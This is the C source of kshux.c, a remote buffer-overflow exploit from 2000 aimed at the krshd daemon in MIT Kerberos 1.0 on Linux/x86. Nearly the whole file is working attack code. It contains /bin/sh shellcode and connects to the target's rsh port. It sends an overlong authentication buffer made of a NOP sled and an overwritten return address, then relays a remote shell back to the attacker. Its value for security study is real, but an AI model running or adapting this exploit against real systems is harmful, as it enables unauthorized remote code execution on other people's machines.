/********
 * kshux.c -- krshd remote exploit
 * written April 8, 2000
 * Jim Paris <jim@jtan.com>
 * 
 * This program exploits a vulnerability in the 'krshd' daemon included
 * with the MIT Kerberos distribution.  All versions are apparently
 * vulnerable.
 *
 * This exploit is for Linux/x86 with Kerberos version 1.0, but you'll
 * probably need a fair bit of coaxing to get it to work.
 *
 * And yes, it's ugly.  I need to accept an incoming connection from the
 * remote server, handle the fact that the overflow goes through two
 * functions and a toupper(), make sure that certain overwritten pointers
 * on the remote host's stack are set to valid values so that a strlen
 * call in krb425_conv_principal() doesn't cause a segfault before we
 * return into the shellcode, adjust the offset depending on the remote
 * hostname to properly align things, etc etc.  As a result, you'll
 * probably have a hard time getting this to work -- it took a lot of
 * hacking and hardcoded numbers to get this to work against my test
 * systems.
 *
 */

#include <stdio.h>
#include <sys/types.h>
#include <netdb.h>
#include <time.h>
#include <netinet/in.h>

#define LEN 1200
#define OFFSET 0
#define ADDR 0xbfffd7a4

char *sc="\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46"
         "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
         "\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

void get_incoming(int r) {
  int s, l=1; struct sockaddr_in sa, ra;
  bzero(&sa,sizeof(sa));
  sa.sin_family=AF_INET;
  sa.sin_addr.s_addr=htonl(INADDR_ANY);
  sa.sin_port=htons(16474);
  if((s=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)
    perror("socket"),exit(1);
  setsockopt(s,SOL_SOCKET,SO_REUSEADDR,&l,sizeof(l));
  if(bind(s,(struct sockaddr *)&sa,sizeof(sa))<0)
    perror("bind"),exit(1);
  if(listen(s,1)) 
    perror("listen"),exit(1);
  write(r,"16474",6);
  if(accept(s,&sa,&l)<0) 
    perror("accept"),exit(1);
}

int con_outgoing(char *h) {
  int s, i; struct sockaddr_in a; struct hostent *e;
  if((s=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)
    perror("socket"),exit(1);
  if((i=inet_addr(h))==INADDR_NONE) { 
    if((e=gethostbyname(h))==NULL)
      perror("gethostbyname"),exit(1);
    bcopy(e->h_addr,&i,sizeof(i)); }
  bzero(&a,sizeof(a));
  a.sin_family=AF_INET;
  a.sin_addr.s_addr=i;
  a.sin_port=htons(544);
  if(connect(s,(struct sockaddr *)&a,sizeof(a))<0)
    perror("connect"),exit(1);
  return s;
}

void bus(int s) {
  int i; fd_set r; char b[1024];
  for(;;) {
    FD_ZERO(&r); FD_SET(0,&r); FD_SET(s,&r);
    if((i=select(s+1,&r,NULL,NULL,NULL))==-1)
      perror("select"),exit(1);
    if(i==0) fprintf(stderr,"closed\n"),exit(0);
    if(FD_ISSET(s,&r)) {
      if((i=read(s,b,sizeof(b)))<1)
	fprintf(stderr,"closed\n"),exit(0);
      write(1,b,i); }
    if(FD_ISSET(0,&r)) {
      if((i=read(0,b,sizeof(b)))<1)
	fprintf(stderr,"closed\n"),exit(0);
      write(s,b,i); } }
}

void main(int ac, char *av[])
{
  int s, i, j, a=ADDR, o=OFFSET;
  int l, h;
  char b[LEN];

  if(ac<2) { 
    fprintf(stderr,"%s hostname [addr] [offset]\n",*av);
    exit(1);
  }
  a+=(ac>2)?atoi(av[2]):0;
  o+=(ac>3)?atoi(av[3]):(4-(strlen(av[1])%4));
  o%=4;
  if(o<0) o+=4;
  l=(ac>4)?atoi(av[4]):-10;
  h=(ac>5)?atoi(av[5]):10;
  fprintf(stderr,"addr=%p, offset=%d\n",a,o);

  if(isupper(((char *)&a)[0]) ||
     isupper(((char *)&a)[1]) ||
     isupper(((char *)&a)[2]) ||
     isupper(((char *)&a)[3]))
    fprintf(stderr,"error: addr contains uppercase\n"),exit(0);

  s=con_outgoing(av[1]);
  get_incoming(s);

  sprintf(&b[0],"AUTHV0.1blahblah");
  *(int *)(b+16)=htonl(LEN);
  b[20]=4; b[21]=7; b[22]=123;
  write(s,b,23);

  for(i=0;i<LEN-8-strlen(sc)-1;i++) b[i]=0x90;
  bcopy(sc,b+i,strlen(sc)+1);
  for(i=LEN-8;i<LEN;i++) b[i]=0x00;

  for(i=255+o+l*4;i<=255+o+h*4;i+=4) *(int *)(b+i)=(a-4);
  *(int *)(b+251+o)=a;

  write(s,b,LEN);

  bus(s);
}


















